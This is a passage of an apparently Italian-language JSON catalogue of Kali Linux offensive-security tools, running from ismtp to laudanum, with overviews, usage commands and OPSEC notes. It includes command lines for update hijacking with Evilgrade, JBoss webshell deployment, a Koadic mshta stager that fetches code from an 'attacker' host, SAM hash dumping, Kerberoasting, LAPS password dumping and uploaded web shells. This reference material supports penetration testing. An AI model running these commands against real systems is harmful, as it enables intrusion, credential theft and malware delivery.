    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ISMTP testa server SMTP per user enumeration. Utilizza comandi VRFY, EXPN e RCPT TO per verificare l'esistenza di indirizzi email. Molti server SMTP sono mal configurati e rivelano quali utenti esistono, utile per costruire liste di target per phishing o brute force.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VRFY Test:</strong> Verifica esistenza utente.</p><p><strong>EXPN Test:</strong> Espande mailing list.</p><p><strong>RCPT TO:</strong> Enumeration via destinatario.</p><p><strong>Wordlist:</strong> Test batch di username.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test singolo utente\nismtp -h mail.target.com -e admin\n\n# Wordlist di utenti\nismtp -h mail.target.com -l users.txt\n\n# Metodo specifico\nismtp -h mail.target.com -l users.txt -m RCPT\n\n# Tutti i metodi\nismtp -h mail.target.com -l users.txt -m ALL</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Email Recon</strong>, verifica indirizzi validi. Nel <strong>Phishing Prep</strong>, costruisce liste target. <strong>Security Assessment</strong> di configurazione SMTP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Moderato:</strong> Connessioni SMTP loggabili. Pattern di enumeration riconoscibile. Rate limiting può bloccare. Alcuni server non rispondono a VRFY/EXPN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMTP"
    ],
    "notes": null
  },
  {
    "id": "isr-evilgrade",
    "name": "isr-evilgrade",
    "version": "2.0.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/isr-evilgrade/",
    "desc": "Framework per attacchi su software update: inietta malware in aggiornamenti legittimi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Evilgrade è un framework per attacchi su meccanismi di software update. Sfrutta aggiornamenti non firmati o con verifica debole per iniettare payload malevoli. Include moduli per decine di applicazioni comuni: Java, Notepad++, VMware, e altri software che non verificano correttamente gli update.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-app:</strong> Moduli per 60+ applicazioni.</p><p><strong>MITM Integration:</strong> Funziona con ARP spoofing/DNS spoofing.</p><p><strong>Payload Injection:</strong> Sostituisce update con malware.</p><p><strong>Modular:</strong> Facile aggiungere nuovi target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia console\nevilgrade\n\n# Lista moduli\nevilgrade> show modules\n\n# Configura modulo\nevilgrade> configure notepadplus\nevilgrade(notepadplus)> set agent payload.exe\nevilgrade(notepadplus)> start\n\n# Richiede MITM separato (ettercap, bettercap)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, compromissione via update spoofing. Nel <strong>Awareness</strong>, dimostra rischi di update non sicuri. <strong>Client-side Attack</strong> quando MITM è possibile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Richiede MITM:</strong> Necessita controllo traffico di rete. Sempre meno efficace (HTTPS, signing). Payload deve evadere AV. Rileva da anomalie certificati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "ivre",
    "name": "ivre",
    "version": "0.9.21",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ivre/",
    "desc": "Framework per raccolta e analisi di dati di network recon con web interface e API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>IVRE (Instrument de Veille sur les Réseaux Extérieurs) è un framework per raccolta, archiviazione e analisi di dati di network reconnaissance. Integra risultati da Nmap, Masscan, ZMap e altri scanner in un database con web interface per visualizzazione e query. Ideale per gestire recon su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-source:</strong> Import da Nmap, Masscan, ZMap.</p><p><strong>Web Interface:</strong> Visualizzazione e ricerca.</p><p><strong>API:</strong> Integrazione programmatica.</p><p><strong>Analytics:</strong> Statistiche e correlazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Import scan Nmap\nivre scan2db -s myscan nmap_output.xml\n\n# Avvia web interface\nivre httpd\n\n# Query CLI\nivre scancli --host 192.168.1.1\nivre scancli --service http\n\n# Export risultati\nivre scancli --json > results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Large Scale Recon</strong>, gestisce milioni di host. Nel <strong>Threat Intel</strong>, analisi dati di scansione. <strong>Asset Management</strong> per inventario network.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi passiva:</strong> IVRE stesso non scanna, analizza. I dati importati possono essere da scan attivi. Database può contenere info sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "jadx",
    "name": "jadx",
    "version": "1.5.2",
    "icon": "../app/icons/jadx-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jadx/",
    "desc": "Decompiler Android che converte DEX/APK in codice Java leggibile con GUI integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JADX è un decompiler per applicazioni Android che converte file DEX e APK in codice Java leggibile. Include una GUI intuitiva per navigare il codice, cercare stringhe, e analizzare risorse. Essenziale per reverse engineering di app Android, analisi malware mobile, e security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilation:</strong> DEX/APK to Java source.</p><p><strong>GUI:</strong> Interfaccia grafica per navigazione.</p><p><strong>Search:</strong> Ricerca globale in codice e risorse.</p><p><strong>Export:</strong> Salva come progetto Gradle.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\njadx-gui\n\n# Decompila da CLI\njadx -d output_dir app.apk\n\n# Con deobfuscation\njadx --deobf app.apk\n\n# Export come Gradle project\njadx -e -d output app.apk</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Mobile Security</strong>, analisi di app Android. Nel <strong>Malware Analysis</strong>, reverse di malware mobile. <strong>Bug Bounty</strong> per trovare vulnerabilità in app.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Analisi completamente locale. Nessun traffico di rete. App offuscate possono essere difficili da analizzare. Alcuni APK hanno anti-decompilation.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "javasnoop",
    "name": "javasnoop",
    "version": "1.1",
    "icon": "../app/icons/javasnoop-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/javasnoop/",
    "desc": "Intercetta e modifica chiamate a metodi Java a runtime per analisi applicazioni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JavaSnoop è un tool per intercettare e modificare chiamate a metodi Java a runtime. Si aggancia a processi Java in esecuzione permettendo di monitorare invocazioni di metodi, modificare parametri e return value. Utile per analisi dinamica di applicazioni Java e bypass di controlli di sicurezza.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Method Hooking:</strong> Intercetta chiamate a metodi.</p><p><strong>Parameter Tampering:</strong> Modifica argomenti in tempo reale.</p><p><strong>Return Modification:</strong> Altera valori di ritorno.</p><p><strong>GUI:</strong> Interfaccia per configurare hook.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia JavaSnoop\njavasnoop\n\n# Dalla GUI:\n# 1. Attach a processo Java\n# 2. Seleziona classi da monitorare\n# 3. Configura hook sui metodi\n# 4. Definisci tampering rules\n# 5. Monitora chiamate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Java Security</strong>, bypass di controlli client-side. Nel <strong>Reverse Engineering</strong>, analisi dinamica di applicazioni. <strong>License Bypass</strong> modificando check di validazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Locale:</strong> Richiede accesso al sistema con l'applicazione. Agent injection rilevabile. Tool datato, alternative moderne: Frida per Java.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "jboss-autopwn",
    "name": "jboss-autopwn",
    "version": "0.1",
    "icon": "../app/icons/jboss-autopwn-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jboss-autopwn/",
    "desc": "Exploit automatico per JBoss/WildFly: deploy webshell via JMX e invoker servlet.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JBoss-autopwn automatizza l'exploitation di server JBoss/WildFly vulnerabili. Sfrutta misconfiguration comuni come JMX Console esposta, web-console accessibile, e invoker servlet non protetti per deployare web shell e ottenere code execution sul server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-vector:</strong> JMX, web-console, invoker servlet.</p><p><strong>Auto-deploy:</strong> Upload automatico di WAR malevoli.</p><p><strong>Shell Access:</strong> Deploy di web shell per accesso persistente.</p><p><strong>Version Detection:</strong> Identifica versione JBoss.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan e exploit automatico\njboss-autopwn target.com 8080\n\n# Con payload specifico\njboss-autopwn -p shell.war target.com 8080\n\n# Solo detection\njboss-autopwn -d target.com 8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Exploitation</strong>, compromissione server JBoss. Nel <strong>Pentesting</strong>, test di configurazioni Java EE. <strong>CTF</strong> con challenge JBoss.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Deploy di WAR loggato. Web shell persistente rilevabile. Pattern di accesso a JMX identificabile. IDS può rilevare payload.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "JBoss_&_WildFly"
    ],
    "notes": null
  },
  {
    "id": "jd-gui",
    "name": "jd-gui",
    "version": "1.6.6",
    "icon": "../app/icons/jd-gui-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jd-gui/",
    "desc": "GUI per decompilare JAR e class file Java in codice sorgente leggibile.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JD-GUI è un decompilatore Java standalone con interfaccia grafica. Converte file .class e archivi JAR in codice sorgente Java leggibile. Essenziale per reverse engineering di applicazioni Java, analisi di malware, e audit di sicurezza di codice bytecode.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilation:</strong> Class files to Java source.</p><p><strong>JAR Support:</strong> Apre interi archivi JAR/WAR/EAR.</p><p><strong>Navigation:</strong> Tree view delle classi e metodi.</p><p><strong>Export:</strong> Salva codice decompilato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\njd-gui\n\n# Apri file specifico\njd-gui application.jar\n\n# Da GUI:\n# File -> Open -> seleziona JAR/class\n# Navigate nella struttura\n# File -> Save All Sources per export</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Java RE</strong>, analisi di applicazioni closed-source. Nel <strong>Security Audit</strong>, review di codice bytecode. <strong>Malware Analysis</strong> di trojan Java.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Analisi completamente locale. Nessun network traffic. Codice offuscato può essere difficile da analizzare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "john-kali",
    "name": "john",
    "version": "1.9.0",
    "icon": "../app/icons/john-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/john/",
    "desc": "Password cracker storico con supporto per centinaia di hash type e regole avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>John the Ripper è il password cracker più storico e versatile. Supporta centinaia di tipi di hash inclusi Unix crypt, Windows NTLM, Kerberos, PDF, ZIP, Office e molti altri. Offre modalità wordlist, incremental (brute force), e regole per mutazione delle password.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-format:</strong> 400+ tipi di hash supportati.</p><p><strong>Wordlist Mode:</strong> Attacco dizionario con regole.</p><p><strong>Incremental:</strong> Brute force intelligente.</p><p><strong>Rules:</strong> Mutazione automatica delle password.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crack hash con wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Con regole\njohn --wordlist=words.txt --rules hashes.txt\n\n# Formato specifico\njohn --format=NT --wordlist=rockyou.txt ntlm.txt\n\n# Mostra password craccate\njohn --show hashes.txt\n\n# Incremental mode\njohn --incremental hashes.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Audit</strong>, test di robustezza credenziali. Nel <strong>Pentesting</strong>, crack di hash estratti. <strong>Forensics</strong> per recupero password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Cracking completamente locale. Alto uso CPU/GPU. john.pot contiene password craccate - proteggere. Nessun traffico di rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "joomscan",
    "name": "joomscan",
    "version": "0.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/joomscan/",
    "desc": "Scanner vulnerabilità specifico per Joomla CMS con detection di componenti e versioni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JoomScan è uno scanner di vulnerabilità specializzato per Joomla CMS. Identifica versione, componenti installati, template, configurazioni insicure e vulnerabilità note. Sviluppato da OWASP, fornisce report dettagliati per assessment di siti Joomla.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Detection:</strong> Identifica versione esatta Joomla.</p><p><strong>Component Enum:</strong> Lista estensioni installate.</p><p><strong>Vuln Database:</strong> Check vulnerabilità note.</p><p><strong>Config Check:</strong> Trova misconfiguration comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\njoomscan -u https://target.com\n\n# Con enumeration componenti\njoomscan -u https://target.com -ec\n\n# Output dettagliato\njoomscan -u https://target.com --enumerate-components\n\n# Con user agent custom\njoomscan -u https://target.com -a \"Custom Agent\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CMS Assessment</strong>, audit di installazioni Joomla. Nel <strong>Bug Bounty</strong>, trova vulnerabilità in componenti. <strong>Pentesting</strong> di siti basati su Joomla.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Multiple richieste HTTP a path specifici. Pattern di scan riconoscibile. User-agent identificabile (customizzabile). Può triggerare WAF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "jsp-file-browser",
    "name": "jsp-file-browser",
    "version": "1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jsp-file-browser/",
    "desc": "Web shell JSP con file browser grafico per navigazione filesystem su server Java.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JSP File Browser è una web shell JSP con interfaccia grafica per file browsing. Permette navigazione del filesystem, upload/download file, e esecuzione comandi su server Java/Tomcat compromessi. Include funzionalità di editing file e gestione directory.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Browser:</strong> Navigazione grafica filesystem.</p><p><strong>Upload/Download:</strong> Transfer file bidirezionale.</p><p><strong>Command Exec:</strong> Esecuzione comandi sistema.</p><p><strong>Edit:</strong> Modifica file direttamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Deploy la shell su target Tomcat\n# Upload jsp-file-browser.jsp a webapps/\n\n# Accedi via browser\nhttps://target.com/app/jsp-file-browser.jsp\n\n# Naviga filesystem\n# Upload/download file\n# Esegui comandi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-exploitation</strong>, accesso persistente su server Java. Nel <strong>File Exfiltration</strong>, download dati da server compromesso. <strong>Lateral Movement</strong> via upload di tool.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alta visibilità:</strong> File JSP su disco rilevabile. Access log registra ogni richiesta. AV può rilevare pattern web shell. Rimuovere dopo uso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "jsql",
    "name": "jsql",
    "version": "0.112",
    "icon": "../app/icons/jsql-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jsql/",
    "desc": "GUI Java per SQL injection automatica con supporto per 33 database e tecniche avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>jSQL Injection è un tool con GUI per automatizzare attacchi SQL injection. Supporta 33 database tra cui MySQL, PostgreSQL, Oracle, SQL Server, SQLite. Implementa tecniche Union, Error-based, Blind, Time-based e Out-of-band per estrazione dati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-DB:</strong> 33 database supportati.</p><p><strong>Auto-detection:</strong> Identifica tipo injection e database.</p><p><strong>GUI:</strong> Interfaccia grafica intuitiva.</p><p><strong>Techniques:</strong> Union, Error, Blind, Time, OOB.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\njsql\n\n# Dalla GUI:\n# 1. Inserisci URL vulnerabile con parametro\n# 2. Click su check per detection automatica\n# 3. Naviga database, tabelle, colonne\n# 4. Estrai dati\n# 5. Admin page finder, hash cracker integrati</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Pentesting</strong>, exploitation SQLi con GUI. Nel <strong>CTF</strong>, estrazione dati da DB vulnerabili. <strong>Learning</strong> per capire tecniche SQLi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Multiple query SQL injection. Pattern riconoscibile da WAF/IDS. Log applicativi registrano injection. Encoding evasion disponibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "kerberoast",
    "name": "kerberoast",
    "version": "0.0~git20221231.cc5aa6e",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/kerberoast/",
    "desc": "Script per Kerberoasting: richiede TGS per service account e cracca hash offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerberoast è un toolkit per attacchi Kerberoasting su Active Directory. Richiede Ticket Granting Service (TGS) per account con ServicePrincipalName (SPN) configurato, poi estrae l'hash della password dal ticket per cracking offline. Non richiede privilegi elevati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SPN Enumeration:</strong> Trova account con SPN.</p><p><strong>TGS Request:</strong> Richiede ticket per servizi.</p><p><strong>Hash Extraction:</strong> Estrae hash crackabile.</p><p><strong>Multiple formats:</strong> Output per John/Hashcat.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera SPN e richiedi TGS\npython kerberoast.py -d domain.com -u user -p password\n\n# Solo enumeration\nGetUserSPNs.py domain/user:password -dc-ip 10.10.10.1\n\n# Richiedi TGS e salva hash\nGetUserSPNs.py domain/user:password -dc-ip 10.10.10.1 -request\n\n# Crack con hashcat\nhashcat -m 13100 hashes.txt rockyou.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, privilege escalation via service account. Nel <strong>Red Team</strong>, movimento laterale con credenziali. <strong>Security Audit</strong> di password service account.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Moderato:</strong> TGS request è operazione legittima. Event 4769 generato. Anomalo richiedere TGS per molti SPN. Crack è offline e invisibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kismet",
    "name": "kismet",
    "version": "2023.07.R2",
    "icon": "../app/icons/kismet-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/kismet/",
    "desc": "Wireless sniffer, IDS e wardriving tool con supporto WiFi, Bluetooth, SDR e Zigbee.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kismet è un detector, sniffer e IDS wireless passivo. Supporta WiFi, Bluetooth, Software Defined Radio (SDR), Zigbee e altri protocolli RF. Eccellente per wardriving, detection di rogue AP, e monitoraggio wireless. Include web UI e logging avanzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocol:</strong> WiFi, BT, SDR, Zigbee, DECT.</p><p><strong>Passive:</strong> Sniffing senza trasmissioni.</p><p><strong>IDS:</strong> Detection di attacchi wireless.</p><p><strong>GPS Integration:</strong> Wardriving con mapping.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Kismet\nkismet\n\n# Con interfaccia specifica\nkismet -c wlan0\n\n# Accedi web UI\nhttp://localhost:2501\n\n# Con GPS\nkismet -c wlan0 --gps-gpsd\n\n# Export in formato pcap\nkismet -c wlan0 --log-types pcapng</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Recon</strong>, mapping di reti WiFi. Nel <strong>Security Audit</strong>, trova rogue AP. <strong>Wardriving</strong> con logging GPS. <strong>IoT Assessment</strong> per Zigbee/BT.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Non trasmette, solo riceve. Indistinguibile da traffico normale. Richiede monitor mode per WiFi. Log contiene dati sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "koadic",
    "name": "koadic",
    "version": "0~git20210412",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/koadic/",
    "desc": "C2 framework Windows che usa JScript/VBScript per post-exploitation via COM object.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Koadic è un framework C2 per Windows che opera tramite Windows Script Host (JScript/VBScript). Utilizza COM objects nativi per post-exploitation, evitando binary su disco. Include stager, implant e moduli per enumeration, credential dumping, e lateral movement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living-off-the-land:</strong> Usa componenti Windows nativi.</p><p><strong>Stageless:</strong> Implant via JScript/VBScript.</p><p><strong>Modular:</strong> Plugin per varie operazioni.</p><p><strong>Multi-user:</strong> Supporta operatori multipli.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Koadic\nkoadic\n\n# Genera stager\n(koadic)> use stager/js/mshta\n(koadic)> set SRVPORT 8080\n(koadic)> run\n\n# Su target Windows:\nmshta http://attacker:8080/stager\n\n# Usa moduli\n(koadic)> zombies\n(koadic)> use implant/gather/hashdump_sam</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 Windows fileless. Nel <strong>Pentesting</strong>, post-exploitation via script. <strong>AV Evasion</strong> usando componenti legittimi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> MSHTA/WScript monitoring. PowerShell logging rileva attività. Network C2 traffic. Signature dei pattern Koadic note.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "0.0~git20250127.aef69a7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/krbrelayx/",
    "desc": "Relay e abuse di Kerberos per attacchi unconstrained delegation e S4U2Self.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Krbrelayx è un toolkit per attacchi Kerberos avanzati. Sfrutta delegation misconfiguration (unconstrained, constrained, RBCD), S4U2Self/S4U2Proxy, e permette Kerberos relay. Fondamentale per privilege escalation in ambienti AD con delegation configurata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unconstrained Delegation:</strong> Cattura TGT da computer.</p><p><strong>RBCD:</strong> Resource-Based Constrained Delegation abuse.</p><p><strong>S4U:</strong> Self/Proxy impersonation.</p><p><strong>DNS Update:</strong> Modifica record per relay.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener per unconstrained delegation\nkrbrelayx.py -hashes :HASH\n\n# Trigger con printerbug\nprinterbug.py domain/user:password@dc.domain.com attacker-machine\n\n# Export TGT catturato\nexport KRB5CCNAME=admin.ccache\n\n# RBCD attack\nrbcd.py -delegate-to target$ -delegate-from attacker$ domain/user:pass</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, privilege escalation via delegation. Nel <strong>Red Team</strong>, domain admin via unconstrained. <strong>Lateral Movement</strong> con ticket impersonation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Event 4624 per impersonation. TGT request anomali. DNS modification loggata. Richiede posizionamento specifico in rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "lapsdumper",
    "name": "lapsdumper",
    "version": "0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/lapsdumper/",
    "desc": "Estrae password LAPS (Local Admin Password Solution) da Active Directory via LDAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LAPSDumper estrae password LAPS (Local Administrator Password Solution) da Active Directory. LAPS gestisce password admin locali uniche per ogni computer, memorizzandole in attributi AD. Con i giusti permessi, è possibile leggerle per accesso admin locale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LAPS Query:</strong> Legge ms-Mcs-AdmPwd da AD.</p><p><strong>Bulk Dump:</strong> Estrae per tutti i computer accessibili.</p><p><strong>Filter:</strong> Filtra per OU, gruppo, nome.</p><p><strong>Export:</strong> Output in vari formati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump LAPS passwords\nlapsdumper -u user -p password -d domain.com\n\n# Con LDAP specifico\nlapsdumper -u user -p pass -d domain.com -l dc.domain.com\n\n# Filtra per computer\nlapsdumper -u user -p pass -d domain.com -c WORKSTATION01\n\n# Con hash NTLM\nlapsdumper -u user -H NTHASH -d domain.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong>, accesso admin locale. Nel <strong>Lateral Movement</strong>, password diverse per ogni host. <strong>AD Assessment</strong> di permessi LAPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Loggabile:</strong> LDAP query per attributi LAPS. Permessi specifici richiesti. Event log su read di ms-Mcs-AdmPwd. Necessita credenziali valid.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "laudanum",
    "name": "laudanum",
    "version": "1.0",
    "icon": "../app/icons/laudanum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/laudanum/",
    "desc": "Collezione di web shell in ASP, ASPX, JSP, PHP per vari scenari di post-exploitation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Laudanum è una collezione di web shell pronte all'uso per diversi linguaggi: ASP, ASPX, JSP, PHP. Include shell con varie funzionalità come command execution, file browser, reverse shell, proxy. Progettate per essere piccole e difficili da rilevare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-language:</strong> ASP, ASPX, JSP, PHP, CFM.</p><p><strong>Various shells:</strong> Command, file browser, reverse.</p><p><strong>Minimal:</strong> Dimensioni ridotte per upload.</p><p><strong>Customizable:</strong> Parametri configurabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Location in Kali\nls /usr/share/laudanum/\n\n# PHP shell\ncp /usr/share/laudanum/php/shell.php .\n# Upload al target\n# Accedi: http://target/shell.php?cmd=id\n\n# ASPX reverse shell\ncp /usr/share/laudanum/aspx/shell.aspx .\n# Modifica IP/porta, upload, trigger</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-exploitation</strong>, accesso persistente via web. Nel <strong>File Upload</strong>, shell per vari stack. <strong>Pivoting</strong> attraverso web server compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> AV/EDR riconoscono pattern. File su disco persistente. Access log registra comandi. Usare nomi innocui e rimuovere dopo uso.</p><br><hr>",
    "best_in": false,
